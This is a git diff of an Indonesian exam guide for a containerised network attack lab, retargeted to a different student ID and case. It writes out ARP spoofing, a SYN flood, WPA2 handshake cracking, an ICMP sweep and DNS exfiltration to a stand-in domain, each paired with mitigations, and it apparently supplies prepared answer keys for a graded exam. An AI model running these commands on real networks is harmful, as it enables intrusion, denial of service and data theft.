@@ -1,6 +1,6 @@
 # Panduan Pengerjaan UTS — Network Attack Lab
 
-**NIM:** 19552011024 → jumlah digit = 30 → 30 mod 10 = 0 → **Kasus 10 (k10)**
+**NIM:** 24552011027 → jumlah digit = 2+4+5+5+2+0+1+1+0+2+7 = 29 → 29 mod 10 = 9 → **Kasus 9 (k9)**
 
 Semua perintah di bawah sudah disesuaikan dengan laptop ini. Baca bagian
 **"Perbedaan dari soal asli"** dulu, karena ada beberapa perintah yang harus
@@ -16,9 +16,9 @@ binary standalone **`docker-compose` v5.7.0** di `/usr/local/bin/docker-compose`
 
 | Soal asli | Yang harus kamu pakai di laptop ini |
 |---|---|
-| `docker compose -p k10 -f ...` | `docker-compose -p k10 -f ...` (pakai **strip/tanda hubung**) |
-| `docker exec korban-k10 arp -s ...` | `docker exec korban-k10 ip neigh replace ...` → lihat catatan di Kasus 3 |
-| `-pass kunci-k10-2026` | `-pass pass:kunci-k10-2026` (OpenSSL modern menolak tanpa awalan `pass:`) |
+| `docker compose -p k9 -f ...` | `docker-compose -p k9 -f ...` (pakai **strip/tanda hubung**) |
+| `docker exec korban-k9 arp -s ...` | `docker exec korban-k9 ip neigh replace ...` → lihat catatan di Kasus 3 |
+| `-pass kunci-k9-2026` | `-pass pass:kunci-k9-2026` (OpenSSL modern menolak tanpa awalan `pass:`) |
 
 Kalau kamu ketik `docker compose` (pakai spasi) hasilnya
 `docker: unknown command: docker compose`. Pakai `docker-compose` (hubung).
@@ -93,7 +93,7 @@ Setelah semua selesai:
 
 ```bash
 git add -A
-git commit -m "Add lab evidence: kasus k10 (UTS)"
+git commit -m "Add lab evidence: kasus k9 (UTS)"
 ```
 
 > **Aturan angka:** jangan menulis angka di laporan kalau angka itu tidak
@@ -107,26 +107,26 @@ git commit -m "Add lab evidence: kasus k10 (UTS)"
 Perintah (sudah disesuaikan, `docker-compose` pakai hubung):
 
 ```bash
-docker volume create vol-k10
+docker volume create vol-k9
 
-docker run --name w-k10 -v vol-k10:/data alpine:3.20 sh -c 'echo 19552011024 > /data/laporan-k10.txt'
-docker rm w-k10
-docker run --rm -v vol-k10:/data alpine:3.20 cat /data/laporan-k10.txt
+docker run --name w-k9 -v vol-k9:/data alpine:3.20 sh -c 'echo 24552011027 > /data/laporan-k9.txt'
+docker rm w-k9
+docker run --rm -v vol-k9:/data alpine:3.20 cat /data/laporan-k9.txt
 
-docker-compose -p k10 -f lab/b/b1-compose/docker-compose.yml up -d
-docker-compose -p k10 -f lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
-docker-compose -p k10 -f lab/b/b1-compose/docker-compose.yml down -v
+docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml up -d
+docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
+docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml down -v
 ```
 
 **Screenshot — simpan sebagai:**
 
 | Nama file | Isi |
 |---|---|
-| `docs/evidence/01-docker-volume/01-volume-survives.png` | bagian `docker rm w-k10` + `cat` yang mengeluarkan `19552011024` |
+| `docs/evidence/01-docker-volume/01-volume-survives.png` | bagian `docker rm w-k9` + `cat` yang mengeluarkan `24552011027` |
 | `docs/evidence/01-docker-volume/02-attacker-to-target.png` | halaman HTML nginx dari `wget` |
 
-**Yang harus kelihatan di gambar:** angka `19552011024` muncul setelah container
-`w-k10` dihapus (bukti data ikut volume, bukan container), dan tag `<title>`
+**Yang harus kelihatan di gambar:** angka `24552011027` muncul setelah container
+`w-k9` dihapus (bukti data ikut volume, bukan container), dan tag `<title>`
 HTML nginx dari attacker.
 
 **Jawaban singkat untuk laporan:** data bertahan karena volume adalah objek
@@ -141,18 +141,18 @@ Perintah (perhatikan `-pass pass:` — soal asli salah tulis):
 
 ```bash
 docker run --rm -v "$PWD":/work uts-openssl sh -c '
-  echo isi laporan k10 > laporan-k10.txt &&
-  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k10.txt -out laporan-k10.enc -pass pass:kunci-k10-2026 &&
+  echo isi laporan k9 > laporan-k9.txt &&
+  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 &&
   echo "--- hash plaintext ---" &&
-  sha256sum laporan-k10.txt &&
-  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k10.enc -out hasil-k10.txt -pass pass:kunci-k10-2026 &&
+  sha256sum laporan-k9.txt &&
+  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 &&
   echo "--- hash hasil dekripsi ---" &&
-  sha256sum hasil-k10.txt'
+  sha256sum hasil-k9.txt'
 
 docker run --rm -v "$PWD":/work uts-openssl sh -c '
-  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k10.pem -out cert-k10.pem \
-    -days 30 -subj /CN=k10.uts.local &&
-  openssl x509 -in cert-k10.pem -noout -subject -issuer -dates'
+  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem \
+    -days 30 -subj /CN=k9.uts.local &&
+  openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
 ```
 
 **Screenshot — simpan sebagai:**
@@ -163,15 +163,15 @@ docker run --rm -v "$PWD":/work uts-openssl sh -c '
 | `docs/evidence/02-cryptography/02-certificate.png` | `subject`, `issuer`, `notBefore`, `notAfter` |
 
 **Yang harus kelihatan di gambar:** dua hash SHA-256 identik (bukti
-enkripsi→dekripsi lossless), lalu `subject=CN = k10.uts.local` dan
-`issuer=CN = k10.uts.local` (self-signed).
+enkripsi→dekripsi lossless), lalu `subject=CN = k9.uts.local` dan
+`issuer=CN = k9.uts.local` (self-signed).
 
 **Kunci jawaban:** hash sama = round-trip benar. `-pbkdf2` membuat derivasi key
 lambat sehingga brute force mahal, `-salt` membuat ciphertext beda tiap run.
 Self-signed = issuer sama dengan subject, jadi terenkripsi tapi tidak
 terautentikasi.
 
-> **Catatan:** `laporan-k10.txt`, `*.enc`, `*.pem` tertulis di `.gitignore`, jadi
+> **Catatan:** `laporan-k9.txt`, `*.enc`, `*.pem` tertulis di `.gitignore`, jadi
 > tidak akan ikut ter-commit. Itu memang disengaja.
 
 ---
@@ -182,30 +182,45 @@ Jalankan perintah ini satu blok. IP korban & gateway diambil otomatis, jadi
 kamu tidak perlu mengetik IP manual:
 
 ```bash
-docker network create lab-arp-k10
+docker network create lab-arp-k9
 
-docker run -d --name korban-k10    --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
-docker run -d --name gateway-k10   --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
-docker run -d --name penyerang-k10 --network lab-arp-k10 --cap-add NET_ADMIN uts-kali-tools
+docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
+docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
+docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
 
 # CATATAN: nama network mengandung '-' dan Go template Docker menolak karakter
 # itu di {{.a.b-c}}, jadi WAJIB pakai sintaks index seperti di bawah.
-IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10)
-IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' gateway-k10)
-MAC_GW=$(docker exec gateway-k10 cat /sys/class/net/eth0/address)
+IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
+IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
+MAC_GW=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
 echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"
 
-echo "=== 1. SEBELUM (baseline) ==="
-docker exec korban-k10 ip neigh show
+echo "=== 0. samakan titik awal (reset ke MAC gateway asli + ping) ==="
+# PENTING: jangan pakai 'ip neigh del' — justru membuat korban menolak ARP reply
+# sehingga langkah 2 selalu terlihat gagal. Reset ke MAC asli dengan state
+# reachable, lalu ping. Ini membuat poisoning masuk cepat dan konsisten.
+docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
+docker exec korban-k9 ping -c 2 "$IP_GW" >/dev/null 2>&1
 
-echo "=== 2. SAAT DISERANG (tunggu ~3 detik) ==="
-docker exec -d penyerang-k10 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW"
-sleep 3
-docker exec korban-k10 ip neigh show
+echo "=== 1. SEBELUM (baseline) ==="
+docker exec korban-k9 ip neigh show "$IP_GW"
+
+echo "=== 2. SAAT DISERANG ==="
+docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null
+# Tunggu sampai MAC benar-benar berubah (poison masuk dalam 1-11 detik,
+# jadi jangan pakai sleep tetap — polling sampai berubah, maks 12 detik)
+for i in $(seq 1 12); do
+  sleep 1
+  M=$(docker exec korban-k9 ip neigh show "$IP_GW" | sed -n 's/.*lladdr \([0-9a-f:]*\).*/\1/p')
+  [ "$M" != "$MAC_GW" ] && break
+done
+docker exec korban-k9 ip neigh show "$IP_GW"
+echo "mac gateway asli : $MAC_GW"
+echo "mac penyerang    : $(docker exec penyerang-k9 cat /sys/class/net/eth0/address)"
 
 echo "=== 3. SETELAH MITIGASI (static ARP) ==="
-docker exec korban-k10 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
-docker exec korban-k10 ip neigh show
+docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
+docker exec korban-k9 ip neigh show "$IP_GW"
 ```
 
 **Screenshot — simpan sebagai (tiga gambar, lebih kuat dari satu):**
@@ -217,7 +232,7 @@ docker exec korban-k10 ip neigh show
 | `docs/evidence/03-arp-spoofing/02-static-arp.png` | blok "3. SETELAH MITIGASI" — MAC gateway benar + `PERMANENT` |
 
 **Yang harus kelihatan di gambar:** MAC di kolom `lladdr` untuk IP gateway
-**berubah** di langkah 2 (sekarang milik `penyerang-k10`) — itu bukti poisoning
+**berubah** di langkah 2 (sekarang milik `penyerang-k9`) — itu bukti poisoning
 berhasil — lalu **kembali benar** di langkah 3 dan bertanda `PERMANENT`.
 
 **Kunci jawaban:** ARP tidak punya autentikasi, host menerima ARP reply terakhir
@@ -234,20 +249,20 @@ posisi MITM tidak otomatis berarti plaintext.
 **Bersihkan setelah selesai:**
 
 ```bash
-docker rm -f korban-k10 gateway-k10 penyerang-k10
-docker network rm lab-arp-k10
+docker rm -f korban-k9 gateway-k9 penyerang-k9
+docker network rm lab-arp-k9
 ```
 
 ---
 
 ## Kasus 4 — Analisis handshake WPA2 (Pertemuan 4)
 
-File `handshake-k10.cap` dan `wordlist-k10.txt` disediakan penguji. Letakkan
+File `handshake-k9.cap` dan `wordlist-k9.txt` disediakan penguji. Letakkan
 keduanya di root repo, lalu:
 
 ```bash
 docker run --rm -v "$PWD":/work uts-kali-tools \
-  aircrack-ng -w wordlist-k10.txt handshake-k10.cap
+  aircrack-ng -w wordlist-k9.txt handshake-k9.cap
 ```
 
 **Screenshot — simpan sebagai:**
@@ -278,13 +293,13 @@ Mitigasi: passphrase panjang acak, **WPA3-SAE** (tahan offline dictionary),
 
 ## Kasus 5 — ICMP dengan Scapy (Pertemuan 5)
 
-Masih pakai network `lab-arp-k10` dari Kasus 3. Kalau container sudah kamu
+Masih pakai network `lab-arp-k9` dari Kasus 3. Kalau container sudah kamu
 hapus, jalankan ulang blok pembuatan network di Kasus 3 (tanpa bagian mitigasi).
 
 ```bash
-IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k10").IPAddress}}' korban-k10)
+IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
 
-docker run --rm --network lab-arp-k10 \
+docker run --rm --network lab-arp-k9 \
   -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
   python3 /work/kirim_icmp.py "$IP_KORBAN"
 ```
@@ -292,12 +307,12 @@ docker run --rm --network lab-arp-k10 \
 Untuk gambar kedua (sweep host), jalankan ini:
 
 ```bash
-SUBNET=$(docker network inspect lab-arp-k10 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
-HOSTS=$(docker network inspect lab-arp-k10 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
+SUBNET=$(docker network inspect lab-arp-k9 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
+HOSTS=$(docker network inspect lab-arp-k9 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
         | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
 echo "subnet: $SUBNET"
 echo "host: $HOSTS"
-docker run --rm --network lab-arp-k10 uts-kali-tools python3 -c "
+docker run --rm --network lab-arp-k9 uts-kali-tools python3 -c "
 from scapy.all import ICMP, IP, sr
 ans, _ = sr(IP(dst='$HOSTS'.split(','))/ICMP(), timeout=3, verbose=False)
 print('Host hidup:')
@@ -336,18 +351,18 @@ dipalsukan** + **amplifikasi broadcast**. Mitigasi: matikan directed broadcast
 Tutup browser dulu — RAM kamu 7.5 GB dan sedang terpakai 4.7 GB.
 
 ```bash
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml up -d
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml up -d
 
 echo "=== 1. SEBELUM SERANGAN ==="
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
 
 echo "=== 2. SAAT SERANGAN (tunggu 5 detik) ==="
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
 sleep 5
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
 
 echo "=== 3. TANGKAP HANDSHAKE ==="
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c \
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c \
   'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
 ```
 
@@ -363,8 +378,8 @@ serangan, dan di tcpdump: `Flags [S]` = SYN, `Flags [S.]` = SYN-ACK,
 `Flags [.]` = ACK. Lihat catatan penting di bawah sebelum menulis angka.
 
 > **PENTING soal angka SYN_RECV:** di laptop ini kamu akan melihat angka yang
-> **kecil** — hasil pengukuran aku: `0` sebelum serangan, `1` saat serangan,
-> padahal hping3 mengirim **1.3 juta paket** dalam 10 detik. Ini **bukan
+> **kecil** — hasil pengukuran aku: `0` sebelum serangan, `5` saat serangan,
+> padahal hping3 mengirim **~790.000 paket** dalam 10 detik. Ini **bukan
 > kegagalan**. Penyebabnya: **SYN cookies aktif** di kernel (nilai 1, sudah aku
 > cek di `/proc/sys/net/ipv4/tcp_syncookies`), sehingga server tidak menyimpan
 > state half-open — dia mengencode state ke sequence number, jadi backlog queue
@@ -372,11 +387,11 @@ serangan, dan di tcpdump: `Flags [S]` = SYN, `Flags [S.]` = SYN-ACK,
 > bisa dimatikan tanpa `--privileged`.
 >
 > **Ini justru bahan jawaban terbaikmu.** Tulis di laporan: percobaan flood
-> mengirim 1.3 juta paket, tetapi jumlah `SYN_RECV` tetap ~0 karena SYN cookies
-> sudah aktif — jadi serangan berhasil di-*mitigasi* oleh kernel. Lalu jelaskan
-> apa yang akan terjadi kalau syncookies dimatikan (backlog 512 akan penuh dan
-> client sah ditolak). Itu menunjukkan kamu paham mekanisme DAN pertahanannya,
-> bukan cuma bisa menjalankan tool.
+> mengirim ~790.000 paket, tetapi jumlah `SYN_RECV` hanya naik ke `5` karena
+> SYN cookies sudah aktif — jadi serangan berhasil di-*mitigasi* oleh kernel.
+> Lalu jelaskan apa yang akan terjadi kalau syncookies dimatikan (backlog 512
+> akan penuh dan client sah ditolak). Itu menunjukkan kamu paham mekanisme DAN
+> pertahanannya, bukan cuma bisa menjalankan tool.
 >
 > Bukti visual yang tetap kuat: **screenshot tcpdump-nya** — itu menunjukkan
 > lautan SYN dari hping3 dan handshake legit di antaranya.
@@ -391,7 +406,7 @@ SYN di edge, dan uRPF.
 **Bersihkan:**
 
 ```bash
-docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml down -v
+docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml down -v
 ```
 
 ---
@@ -399,27 +414,27 @@ docker-compose -p k10 -f lab/b/b3-syn-flood/docker-compose.yml down -v
 ## Kasus 7 — DNS exfiltration (Pertemuan 7)
 
 ```bash
-docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml up -d
+docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml up -d
 sleep 3
 
 echo "=== 1. ENCODE JADI HEX ==="
-# Dua payload: NIM (22 char, di bawah ambang detektor) dan payload (42 char, di atas)
-NIM=19552011024
+# Dua payload: NIM (22 char, di bawah ambang detektor) dan payload (40 char, di atas)
+NIM=24552011027
 HEX=$(echo -n $NIM | xxd -p)
-PAYLOAD="rahasia-nilai-uts-k10"
+PAYLOAD="rahasia-nilai-uts-k9"
 HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
 echo "NIM   : $NIM  ->  $HEX   ($(echo -n $HEX | wc -c) char)"
 echo "payload: $PAYLOAD  ->  $HEX_PAYLOAD   ($(echo -n $HEX_PAYLOAD | wc -c) char)"
 
 echo "=== 2. KIRIM LEWAT QUERY DNS ==="
-docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
-  dig +short "$HEX.k10.exfil.lab" @dns
-docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
-  dig +short "$HEX_PAYLOAD.k10.exfil.lab" @dns
+docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
+  dig +short "$HEX.k9.exfil.lab" @dns
+docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
+  dig +short "$HEX_PAYLOAD.k9.exfil.lab" @dns
 
 echo "=== 3. AMBIL LOG RESOLVER + DETEKSI ==="
-docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
-python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k10.log
+docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
+python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log
 
 echo "=== 4. DECODE KEMBALI ==="
 echo -n "NIM     : "; echo "$HEX" | xxd -r -p; echo
@@ -431,7 +446,7 @@ echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
 > **>30 karakter** — jadi mengirim NIM saja **tidak akan** muncul sebagai
 > "Query mencurigakan". Itu bukan bug, itu wajar: exfiltration nyata membawa data
 > besar, bukan satu NIM. Karena itu perintah di atas mengirim **dua** query:
-> NIM saja (22 char, tidak kena) dan payload (42 char, kena).
+> NIM saja (22 char, tidak kena) dan payload (40 char, kena).
 >
 > **Batasan DNS yang jadi bahan jawaban bagus:** satu label DNS maksimal **63
 > karakter**. Hex dari payload 83 karakter ditolak `dig` dengan
@@ -443,7 +458,7 @@ echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
 
 | Nama file | Isi |
 |---|---|
-| `docs/evidence/07-dns-exfiltration/01-detect.png` | output `analisis_dns.py` yang menandai label 42 char |
+| `docs/evidence/07-dns-exfiltration/01-detect.png` | output `analisis_dns.py` yang menandai label 40 char |
 | `docs/evidence/07-dns-exfiltration/02-decode.png` | hasil decode yang mengeluarkan NIM dan payload |
 
 **Catatan domain:** image `uts-dnsmasq` di repo ini mengarahkan
@@ -451,9 +466,9 @@ echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
 dan sesuai soal. Yang jadi bukti utama adalah **query tercatat di log resolver**.
 
 **Yang harus kelihatan di gambar:** di langkah 3, baris
-`panjang=42  <hex>.k10.exfil.lab` di bawah **"Query mencurigakan"**, dan
+`panjang=40  <hex>.k9.exfil.lab` di bawah **"Query mencurigakan"**, dan
 `exfil.lab: 2` di bagian jumlah query. Di langkah 4, output decode mengembalikan
-`19552011024` dan `rahasia-nilai-uts-k10`.
+`24552011027` dan `rahasia-nilai-uts-k9`.
 
 **Kunci jawaban:** DNS hampir tidak mungkin diblokir karena resolusi nama itu
 fondasional. Penyerang mendaftarkan domain miliknya, menjalankan resolver
@@ -466,8 +481,8 @@ terkendali dan blokir UDP/TCP 53 keluar**.
 **Bersihkan:**
 
 ```bash
-docker-compose -p k10 -f lab/b/b4-dns-exfil/docker-compose.yml down -v
-rm -f dns-k10.log
+docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml down -v
+rm -f dns-k9.log
 ```
 
 ---
@@ -484,7 +499,7 @@ git status --short
 ls -R docs/evidence/
 
 git add -A
-git commit -m "Add UTS kasus k10 evidence (10 tasks, 7 scenarios)"
+git commit -m "Add UTS kasus k9 evidence (7 scenarios)"
 ```
 
 **Lalu kirim ke aku:** output terminal dari langkah 1-3 tiap kasus (salin-tempel
